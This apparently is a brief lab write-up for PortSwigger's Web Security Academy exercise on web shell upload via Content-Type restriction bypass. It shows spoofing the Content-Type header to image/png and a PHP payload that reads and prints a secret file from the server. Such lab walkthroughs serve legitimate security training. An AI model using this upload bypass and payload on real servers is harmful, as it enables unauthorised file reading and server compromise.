Link: [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
Difficulty: Apprentice

 # Action 
 After attempting to upload the payload I receive this warning
 <img width="1542" height="715" alt="Screenshot_20261031_111226" src="https://github.com/user-attachments/assets/ebc6da60-0b47-48d2-8195-263a56a09807" />

This means that I need to set my Content-Type header to image/png in order to bypass this 
<img width="1540" height="768" alt="Screenshot_20261031_111512" src="https://github.com/user-attachments/assets/72c2f8c5-67e0-44ad-becb-23febb08de82" />

It works with this payload
```
<?php
$filename = "/home/carlos/secret";

if (file_exists($filename)) {
    $content = file_get_contents($filename);
    echo $content;
} else {
    echo "The file does not exist.";
}
?>
```

Well, I just head to open the Image and view the secret.

Happy Hacking!@#$#!@$
